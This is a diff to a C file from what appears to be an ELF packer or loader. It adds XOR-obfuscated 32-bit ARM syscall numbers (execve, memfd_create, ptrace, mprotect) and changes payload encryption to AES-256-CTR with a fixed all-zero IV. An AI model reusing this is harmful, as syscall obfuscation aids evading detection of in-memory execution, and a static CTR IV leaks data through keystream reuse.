@@ -28,6 +28,28 @@ const volatile uint32_t hARMless_sc[SC_TABLE_LEN] = {
     [SC_IDX_IO_URING_ENTER]    = 426u ^ SC_XOR_KEY,
     [SC_IDX_IO_URING_REGISTER] = 427u ^ SC_XOR_KEY,
 };
+#elif defined(__arm__)
+const volatile uint32_t hARMless_sc[SC_TABLE_LEN] = {
+    [SC_IDX_READ]              =   3u ^ SC_XOR_KEY,
+    [SC_IDX_WRITE]             =   4u ^ SC_XOR_KEY,
+    [SC_IDX_OPEN]              =   5u ^ SC_XOR_KEY,
+    [SC_IDX_CLOSE]             =   6u ^ SC_XOR_KEY,
+    [SC_IDX_MMAP]              = 192u ^ SC_XOR_KEY, /* mmap2 on ARM EABI */
+    [SC_IDX_MUNMAP]            =  91u ^ SC_XOR_KEY,
+    [SC_IDX_EXECVE]            =  11u ^ SC_XOR_KEY,
+    [SC_IDX_MEMFD_CREATE]      = 385u ^ SC_XOR_KEY,
+    [SC_IDX_FTRUNCATE]         =  93u ^ SC_XOR_KEY,
+    [SC_IDX_LSEEK]             =  19u ^ SC_XOR_KEY,
+    [SC_IDX_MPROTECT]          = 125u ^ SC_XOR_KEY,
+    [SC_IDX_PTRACE]            =  26u ^ SC_XOR_KEY,
+    [SC_IDX_GETPID]            =  20u ^ SC_XOR_KEY,
+    [SC_IDX_GETPPID]           =  64u ^ SC_XOR_KEY,
+    [SC_IDX_PRCTL]             = 172u ^ SC_XOR_KEY,
+    [SC_IDX_MSYNC]             = 144u ^ SC_XOR_KEY,
+    [SC_IDX_IO_URING_SETUP]    = 425u ^ SC_XOR_KEY,
+    [SC_IDX_IO_URING_ENTER]    = 426u ^ SC_XOR_KEY,
+    [SC_IDX_IO_URING_REGISTER] = 427u ^ SC_XOR_KEY,
+};
 #elif defined(__x86_64__)
 const volatile uint32_t hARMless_sc[SC_TABLE_LEN] = {
     [SC_IDX_READ]              =   0u ^ SC_XOR_KEY,
@@ -51,7 +73,7 @@ const volatile uint32_t hARMless_sc[SC_TABLE_LEN] = {
     [SC_IDX_IO_URING_REGISTER] = 427u ^ SC_XOR_KEY,
 };
 #else
-#error "Unsupported architecture: only aarch64 and x86_64 are supported"
+#error "Unsupported architecture: only arm, aarch64 and x86_64 are supported"
 #endif
 
 __attribute__((used))
@@ -155,18 +177,20 @@ void rc4_encrypt_decrypt(const uint8_t* key, size_t key_len, const uint8_t* inpu
     rc4_crypt(&ctx, input, output, len);
 }
 
-// OpenSSL-based AES-256
+// OpenSSL-based AES-256 in CTR mode. CTR preserves the input length for
+// arbitrary ELF sizes; EVP's padded ECB mode would require storing padding.
 void aes256_encrypt(uint8_t* data, size_t len, const uint8_t* key) {
     EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
     if (!ctx) return;
 
-    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_ecb(), NULL, key, NULL) != 1) {
+    uint8_t iv[16] = {0};
+    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, key, iv) != 1) {
         EVP_CIPHER_CTX_free(ctx);
         return;
     }
 
     int out_len;
-    uint8_t* output = malloc(len + 16); // Padding space
+    uint8_t* output = malloc(len);
     if (!output) {
         EVP_CIPHER_CTX_free(ctx);
         return;
@@ -181,39 +205,13 @@ void aes256_encrypt(uint8_t* data, size_t len, const uint8_t* key) {
     int final_len;
     EVP_EncryptFinal_ex(ctx, output + out_len, &final_len);
 
-    memcpy(data, output, len); // Copy back (ECB mode preserves length)
+    memcpy(data, output, len);
     free(output);
     EVP_CIPHER_CTX_free(ctx);
 }
 
 void aes256_decrypt(uint8_t* data, size_t len, const uint8_t* key) {
-    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
-    if (!ctx) return;
-
-    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_ecb(), NULL, key, NULL) != 1) {
-        EVP_CIPHER_CTX_free(ctx);
-        return;
-    }
-
-    int out_len;
-    uint8_t* output = malloc(len + 16);
-    if (!output) {
-        EVP_CIPHER_CTX_free(ctx);
-        return;
-    }
-
-    if (EVP_DecryptUpdate(ctx, output, &out_len, data, len) != 1) {
-        free(output);
-        EVP_CIPHER_CTX_free(ctx);
-        return;
-    }
-
-    int final_len;
-    EVP_DecryptFinal_ex(ctx, output + out_len, &final_len);
-
-    memcpy(data, output, len);
-    free(output);
-    EVP_CIPHER_CTX_free(ctx);
+    aes256_encrypt(data, len, key);
 }
 
 // OpenSSL-based ChaCha20
